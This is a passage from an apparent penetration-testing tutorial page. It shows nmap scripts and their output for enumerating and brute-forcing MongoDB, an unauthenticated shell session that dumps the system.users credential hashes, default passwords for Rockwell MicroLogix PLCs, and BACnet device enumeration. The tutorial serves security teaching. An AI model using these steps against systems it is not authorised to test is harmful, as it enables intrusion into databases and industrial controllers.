<span class="o">|</span>         <span class="n">wtime</span>
<span class="o">|</span>           <span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
<span class="o">|</span>           <span class="n">totalMillis</span> <span class="o">=</span> <span class="mi">0</span>
<span class="o">|</span>     <span class="n">uptimeEstimate</span> <span class="o">=</span> <span class="mi">3455635</span>
<span class="o">|</span>     <span class="n">version</span> <span class="o">=</span> <span class="mf">2.6</span><span class="o">.</span><span class="mi">9</span>
<span class="o">|</span>     <span class="n">uptime</span> <span class="o">=</span> <span class="mi">3487299</span>
<span class="o">|</span>     <span class="n">network</span>
<span class="o">|</span>       <span class="n">bytesOut</span> <span class="o">=</span> <span class="mi">17159001651</span>
<span class="o">|</span>       <span class="n">numRequests</span> <span class="o">=</span> <span class="mi">78517212</span>
<span class="o">|</span>       <span class="n">bytesIn</span> <span class="o">=</span> <span class="mi">73790966211</span>
<span class="o">|</span>     <span class="n">host</span> <span class="o">=</span> <span class="n">nvt</span><span class="o">-</span><span class="n">prod</span><span class="o">-</span><span class="mi">05</span>
<span class="o">|</span>     <span class="n">mem</span>
<span class="o">|</span>       <span class="n">supported</span> <span class="o">=</span> <span class="n">true</span>
<span class="o">|</span>       <span class="n">virtual</span> <span class="o">=</span> <span class="mi">344</span>
<span class="o">|</span>       <span class="n">resident</span> <span class="o">=</span> <span class="mi">31</span>
<span class="o">|</span>       <span class="n">bits</span> <span class="o">=</span> <span class="mi">64</span>
<span class="o">|</span>     <span class="n">pid</span> <span class="o">=</span> <span class="mi">25964</span>
<span class="o">|</span>     <span class="n">extra_info</span>
<span class="o">|</span>       <span class="n">heap_usage_bytes</span> <span class="o">=</span> <span class="mi">2798848</span>
<span class="o">|</span>       <span class="n">page_faults</span> <span class="o">=</span> <span class="mi">16064</span>
<span class="o">|</span>       <span class="n">note</span> <span class="o">=</span> <span class="n">fields</span> <span class="n">vary</span> <span class="n">by</span> <span class="n">platform</span>
<span class="o">|</span>     <span class="n">asserts</span>
<span class="o">|</span>       <span class="n">warning</span> <span class="o">=</span> <span class="mi">1</span>
<span class="o">|</span>       <span class="n">regular</span> <span class="o">=</span> <span class="mi">1</span>
<span class="o">|</span>       <span class="n">rollovers</span> <span class="o">=</span> <span class="mi">0</span>
<span class="o">|</span>       <span class="n">user</span> <span class="o">=</span> <span class="mi">11344</span>
<span class="o">|</span>       <span class="n">msg</span> <span class="o">=</span> <span class="mi">0</span>
<span class="o">|</span>     <span class="n">process</span> <span class="o">=</span> <span class="n">mongos</span>
<span class="o">|</span><span class="n">_</span>    <span class="n">ok</span> <span class="o">=</span> <span class="mi">1</span>

<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">7.42</span> <span class="n">seconds</span>
</pre></div>
</div>
</div>
<div class="section" id="mongodb-database">
<h4>Mongodb-database<a class="headerlink" href="#mongodb-database" title="Permalink to this headline">¶</a></h4>
<p>To find the databases in the mongodb.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="mf">122.169</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">p</span> <span class="mi">27017</span> <span class="o">-</span><span class="n">sV</span> <span class="o">--</span><span class="n">script</span> <span class="n">mongodb</span><span class="o">-</span><span class="n">databases</span><span class="o">.</span><span class="n">nse</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">02</span><span class="p">:</span><span class="mi">23</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">mongod</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="p">(</span><span class="mf">10.169</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.090</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">27017</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">mongodb</span> <span class="n">MongoDB</span> <span class="mf">2.6</span><span class="o">.</span><span class="mi">9</span>
<span class="o">|</span> <span class="n">mongodb</span><span class="o">-</span><span class="n">databases</span><span class="p">:</span>
<span class="o">|</span>   <span class="n">ok</span> <span class="o">=</span> <span class="mi">1</span>
<span class="o">|</span>   <span class="n">databases</span>
<span class="o">|</span>     <span class="mi">1</span>
<span class="o">|</span>       <span class="n">shards</span>
<span class="o">|</span>       <span class="n">rs0</span> <span class="o">=</span> <span class="mi">1</span>
<span class="o">|</span>         <span class="n">sizeOnDisk</span> <span class="o">=</span> <span class="mi">1</span>
<span class="o">|</span>       <span class="n">empty</span> <span class="o">=</span> <span class="n">true</span>
<span class="o">|</span>       <span class="n">name</span> <span class="o">=</span> <span class="n">test</span>
<span class="o">|</span>     <span class="mi">0</span>
<span class="o">|</span>       <span class="n">shards</span>
<span class="o">|</span>         <span class="n">rs0</span> <span class="o">=</span> <span class="mi">21415067648</span>
<span class="o">|</span>         <span class="n">rs1</span> <span class="o">=</span> <span class="mi">17122197504</span>
<span class="o">|</span>       <span class="n">sizeOnDisk</span> <span class="o">=</span> <span class="mi">38537265152</span>
<span class="o">|</span>       <span class="n">empty</span> <span class="o">=</span> <span class="n">false</span>
<span class="o">|</span>       <span class="n">name</span> <span class="o">=</span> <span class="n">genprod</span>
<span class="o">|</span>     <span class="mi">3</span>
<span class="o">|</span>       <span class="n">sizeOnDisk</span> <span class="o">=</span> <span class="mi">16777216</span>
<span class="o">|</span>       <span class="n">empty</span> <span class="o">=</span> <span class="n">false</span>
<span class="o">|</span>       <span class="n">name</span> <span class="o">=</span> <span class="n">admin</span>
<span class="o">|</span>     <span class="mi">2</span>
<span class="o">|</span>       <span class="n">sizeOnDisk</span> <span class="o">=</span> <span class="mi">50331648</span>
<span class="o">|</span>       <span class="n">empty</span> <span class="o">=</span> <span class="n">false</span>
<span class="o">|</span>       <span class="n">name</span> <span class="o">=</span> <span class="n">config</span>
<span class="o">|</span>   <span class="n">totalSize</span> <span class="o">=</span> <span class="mi">38537265153</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">totalSizeMb</span> <span class="o">=</span> <span class="mi">36752</span>
</pre></div>
</div>
</div>
<div class="section" id="mongodb-bruteforce">
<h4>Mongodb-BruteForce<a class="headerlink" href="#mongodb-bruteforce" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="mf">10.169</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">p</span> <span class="mi">27017</span> <span class="o">-</span><span class="n">sV</span> <span class="o">--</span><span class="n">script</span> <span class="n">mongodb</span><span class="o">-</span><span class="n">brute</span> <span class="o">-</span><span class="n">n</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">02</span><span class="p">:</span><span class="mi">28</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">122.169</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.086</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">27017</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">mongodb</span> <span class="n">MongoDB</span> <span class="mf">2.6</span><span class="o">.</span><span class="mi">9</span>
<span class="o">|</span><span class="n">_mongodb</span><span class="o">-</span><span class="n">brute</span><span class="p">:</span> <span class="n">No</span> <span class="n">authentication</span> <span class="n">needed</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id72">
<h3>Other<a class="headerlink" href="#id72" title="Permalink to this headline">¶</a></h3>
<p>This database can be connected using</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">mongo</span> <span class="mf">10.169</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">MongoDB</span> <span class="n">shell</span> <span class="n">version</span><span class="p">:</span> <span class="mf">2.4</span><span class="o">.</span><span class="mi">10</span>
<span class="n">connecting</span> <span class="n">to</span><span class="p">:</span> <span class="mf">122.169</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">/</span><span class="n">test</span>
</pre></div>
</div>
<p>Show DBS can be used to see the current databases;</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">mongos</span><span class="o">&gt;</span> <span class="n">show</span> <span class="n">dbs</span>
<span class="n">admin</span>        <span class="mf">0.015625</span><span class="n">GB</span>
<span class="n">config</span>       <span class="mf">0.046875</span><span class="n">GB</span>
<span class="n">genprod</span>      <span class="mf">35.890625</span><span class="n">GB</span>
<span class="n">test</span> <span class="p">(</span><span class="n">empty</span><span class="p">)</span>
</pre></div>
</div>
<p>Use command can be used select the database</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">mongos</span><span class="o">&gt;</span> <span class="n">use</span> <span class="n">admin</span>
<span class="n">switched</span> <span class="n">to</span> <span class="n">db</span> <span class="n">admin</span>
</pre></div>
</div>
<p>Show collections can be used to see the tables;</p>
<div class="highlight-default"><div class="highlight"><pre><span></span> <span class="n">mongos</span><span class="o">&gt;</span> <span class="n">show</span> <span class="n">collections</span>
 <span class="n">nxae</span>
 <span class="n">system</span><span class="o">.</span><span class="n">indexes</span>
 <span class="n">system</span><span class="o">.</span><span class="n">users</span>
 <span class="n">system</span><span class="o">.</span><span class="n">version</span>

<span class="n">db</span><span class="o">.</span><span class="n">foo</span><span class="o">.</span><span class="n">find</span><span class="p">()</span>                <span class="nb">list</span> <span class="n">objects</span> <span class="ow">in</span> <span class="n">collection</span> <span class="n">foo</span>

<span class="p">::</span>

 <span class="n">db</span><span class="o">.</span><span class="n">system</span><span class="o">.</span><span class="n">users</span><span class="o">.</span><span class="n">find</span><span class="p">()</span>
 <span class="p">{</span> <span class="s2">&quot;_id&quot;</span> <span class="p">:</span> <span class="s2">&quot;test.root&quot;</span><span class="p">,</span> <span class="s2">&quot;user&quot;</span> <span class="p">:</span> <span class="s2">&quot;root&quot;</span><span class="p">,</span> <span class="s2">&quot;db&quot;</span> <span class="p">:</span> <span class="s2">&quot;test&quot;</span><span class="p">,</span> <span class="s2">&quot;credentials&quot;</span> <span class="p">:</span> <span class="p">{</span> <span class="s2">&quot;MONGODB-CR&quot;</span> <span class="p">:</span> <span class="s2">&quot;d6zzzdb4538zzz339acd585fa9zzzzzz&quot;</span> <span class="p">},</span> <span class="s2">&quot;roles&quot;</span> <span class="p">:</span> <span class="p">[</span>  <span class="p">{</span>  <span class="s2">&quot;role&quot;</span> <span class="p">:</span> <span class="s2">&quot;dbOwner&quot;</span><span class="p">,</span>  <span class="s2">&quot;db&quot;</span> <span class="p">:</span> <span class="s2">&quot;test&quot;</span> <span class="p">}</span> <span class="p">]</span> <span class="p">}</span>
 <span class="p">{</span> <span class="s2">&quot;_id&quot;</span> <span class="p">:</span> <span class="s2">&quot;genprod.root&quot;</span><span class="p">,</span> <span class="s2">&quot;user&quot;</span> <span class="p">:</span> <span class="s2">&quot;root&quot;</span><span class="p">,</span> <span class="s2">&quot;db&quot;</span> <span class="p">:</span> <span class="s2">&quot;genprod&quot;</span><span class="p">,</span> <span class="s2">&quot;credentials&quot;</span> <span class="p">:</span> <span class="p">{</span> <span class="s2">&quot;MONGODB-CR&quot;</span> <span class="p">:</span> <span class="s2">&quot;d6zzzdb4538zzz339acd585fa9zzzzzz&quot;</span> <span class="p">},</span> <span class="s2">&quot;roles&quot;</span> <span class="p">:</span> <span class="p">[</span>  <span class="p">{</span>  <span class="s2">&quot;role&quot;</span> <span class="p">:</span> <span class="s2">&quot;dbOwner&quot;</span><span class="p">,</span>  <span class="s2">&quot;db&quot;</span> <span class="p">:</span> <span class="s2">&quot;genprod&quot;</span> <span class="p">}</span> <span class="p">]</span> <span class="p">}</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="ethernetip-tcp-udp-port-44818">
<h2>EthernetIP-TCP-UDP - Port 44818<a class="headerlink" href="#ethernetip-tcp-udp-port-44818" title="Permalink to this headline">¶</a></h2>
<p>If we found TCP Port 44818, probably it&#8217;s running Ethernet/IP. Rockwell Automation / Allen Bradley developed the protocol and is the primary maker of these devices, e.g. ControlLogix and MicroLogix, but it is an open standard and a number of vendors offer an EtherNet/IP interface card or solution.</p>
<p><a class="reference external" href="https://github.com/digitalbond/Redpoint">Redpoint</a> has released a NSE for enumeration of these devices</p>
<div class="section" id="id73">
<h3>Nmap<a class="headerlink" href="#id73" title="Permalink to this headline">¶</a></h3>
<div class="section" id="enip-enumerate">
<h4>enip-enumerate<a class="headerlink" href="#enip-enumerate" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">44818</span> <span class="o">-</span><span class="n">n</span> <span class="o">--</span><span class="n">script</span> <span class="n">enip</span><span class="o">-</span><span class="nb">enumerate</span> <span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span> <span class="o">-</span><span class="n">Pn</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">25</span> <span class="mi">18</span><span class="p">:</span><span class="mi">49</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.83</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">44818</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">EtherNet</span><span class="o">/</span><span class="n">IP</span>
<span class="o">|</span> <span class="n">enip</span><span class="o">-</span><span class="nb">enumerate</span><span class="p">:</span>
<span class="o">|</span>   <span class="n">Vendor</span><span class="p">:</span> <span class="n">Rockwell</span> <span class="n">Automation</span><span class="o">/</span><span class="n">Allen</span><span class="o">-</span><span class="n">Bradley</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="o">|</span>   <span class="n">Product</span> <span class="n">Name</span><span class="p">:</span> <span class="mi">1766</span><span class="o">-</span><span class="n">L32BXB</span> <span class="n">B</span><span class="o">/</span><span class="mf">10.00</span>
<span class="o">|</span>   <span class="n">Serial</span> <span class="n">Number</span><span class="p">:</span> <span class="mh">0x40605446</span>
<span class="o">|</span>   <span class="n">Device</span> <span class="n">Type</span><span class="p">:</span> <span class="n">Programmable</span> <span class="n">Logic</span> <span class="n">Controller</span> <span class="p">(</span><span class="mi">14</span><span class="p">)</span>
<span class="o">|</span>   <span class="n">Product</span> <span class="n">Code</span><span class="p">:</span> <span class="mi">90</span>
<span class="o">|</span>   <span class="n">Revision</span><span class="p">:</span> <span class="mf">2.10</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">Device</span> <span class="n">IP</span><span class="p">:</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
</pre></div>
</div>
<p>Rockwell Automation has</p>
<ul class="simple">
<li>MicroLogix 1100: Default Username:password is administrator:ml1100</li>
<li>MicroLogix 1400: Default Username:password is administrator:ml1400 User manual is <a class="reference external" href="http://literature.rockwellautomation.com/idc/groups/literature/documents/um/1766-um002_-en-p.pdf">MicroLogix 1400</a> guest:guest is another default password.</li>
</ul>
</div>
</div>
</div>
<div class="section" id="udp-bacnet-port-47808">
<h2>UDP BACNet - Port 47808<a class="headerlink" href="#udp-bacnet-port-47808" title="Permalink to this headline">¶</a></h2>
<p>If we found UDP Port 47808 open, we can use BACnet-discover-enumerate NSE created by <a class="reference external" href="https://github.com/digitalbond/Redpoint">Redpoint</a> Should read <a class="reference external" href="http://www.digitalbond.com/blog/2014/03/26/redpoint-discover-enumerate-bacnet-devices/">Discover Enumerate bacnet devices</a></p>
<div class="section" id="bacnet-discover-enumerate">
<h3>BACNet-discover-enumerate<a class="headerlink" href="#bacnet-discover-enumerate" title="Permalink to this headline">¶</a></h3>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sU</span> <span class="o">-</span><span class="n">p</span> <span class="mi">47808</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">vvv</span> <span class="o">--</span><span class="n">script</span> <span class="n">BACnet</span><span class="o">-</span><span class="n">discover</span><span class="o">-</span><span class="nb">enumerate</span> <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span> <span class="n">full</span><span class="o">=</span><span class="n">yes</span> <span class="mf">182.</span><span class="n">X</span><span class="o">.</span><span class="n">X</span><span class="o">.</span><span class="n">X</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">182.</span><span class="n">X</span><span class="o">.</span><span class="n">X</span><span class="o">.</span><span class="n">X</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.11</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">47808</span><span class="o">/</span><span class="n">udp</span> <span class="nb">open</span>  <span class="n">BACNet</span> <span class="o">--</span> <span class="n">Building</span> <span class="n">Automation</span> <span class="ow">and</span> <span class="n">Control</span> <span class="n">Networks</span>
<span class="o">|</span> <span class="n">BACnet</span><span class="o">-</span><span class="n">discover</span><span class="o">-</span><span class="nb">enumerate</span><span class="p">:</span>
<span class="o">|</span>   <span class="n">Vendor</span> <span class="n">ID</span><span class="p">:</span> <span class="n">Automated</span> <span class="n">Logic</span> <span class="n">Corporation</span> <span class="p">(</span><span class="mi">24</span><span class="p">)</span>
<span class="o">|</span>   <span class="n">Vendor</span> <span class="n">Name</span><span class="p">:</span> <span class="n">Automated</span> <span class="n">Logic</span> <span class="n">Corporation</span>
<span class="o">|</span>   <span class="n">Object</span><span class="o">-</span><span class="n">identifier</span><span class="p">:</span> <span class="mi">2404999</span>
<span class="o">|</span>   <span class="n">Firmware</span><span class="p">:</span> <span class="n">BOOT</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">ver</span><span class="o">=</span><span class="mf">0.01</span><span class="p">:</span><span class="mi">001</span><span class="p">,</span><span class="n">crc</span><span class="o">=</span><span class="mh">0x0000</span><span class="p">)</span> <span class="n">MAIN</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span><span class="n">ver</span><span class="o">=</span><span class="mf">6.00</span><span class="n">a</span><span class="p">:</span><span class="mi">008</span><span class="p">,</span><span class="n">crc</span><span class="o">=</span><span class="mh">0x2050</span><span class="p">)</span>
<span class="o">|</span>   <span class="n">Application</span> <span class="n">Software</span><span class="p">:</span> <span class="n">PRG</span><span class="p">:</span><span class="n">carrier_19xrv_chiller_01_er_mv</span>
<span class="o">|</span>   <span class="n">Object</span> <span class="n">Name</span><span class="p">:</span> <span class="n">device2404999</span>
<span class="o">|</span>   <span class="n">Model</span> <span class="n">Name</span><span class="p">:</span> <span class="n">LGR1000</span>
<span class="o">|</span>   <span class="n">Description</span><span class="p">:</span> <span class="n">Device</span> <span class="n">Description</span>
<span class="o">|</span>   <span class="n">Location</span><span class="p">:</span> <span class="n">Device</span> <span class="n">Location</span>
<span class="o">|</span>   <span class="n">Broadcast</span> <span class="n">Distribution</span> <span class="n">Table</span> <span class="p">(</span><span class="n">BDT</span><span class="p">):</span>
<span class="o">|</span>     <span class="mf">182.</span><span class="n">X</span><span class="o">.</span><span class="n">X</span><span class="o">.</span><span class="n">X</span><span class="p">:</span><span class="mi">47808</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">Foreign</span> <span class="n">Device</span> <span class="n">Table</span> <span class="p">(</span><span class="n">FDT</span><span class="p">):</span> <span class="n">Empty</span> <span class="n">Table</span>
</pre></div>
</div>
<div data-disqus-identifier="Infrastruture PenTest Series : Part 2 - Vulnerability Analysis" data-disqus-shortname="techbitvijays" id="disqus_thread"></div></div>
</div>
</div>


          </div>
        </div>
      </div>
      <div class="clearer"></div>
    </div>
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>Navigation</h3>
      <ul>
        <li class="nav-item nav-item-0"><a href="index.html">tech.bitvijays.com</a> &#187;</li> 
      </ul>
    </div>
    <div class="footer" role="contentinfo">
        &#169; Copyright 2017, Vijay Kumar.
    </div>
  </body>
</html>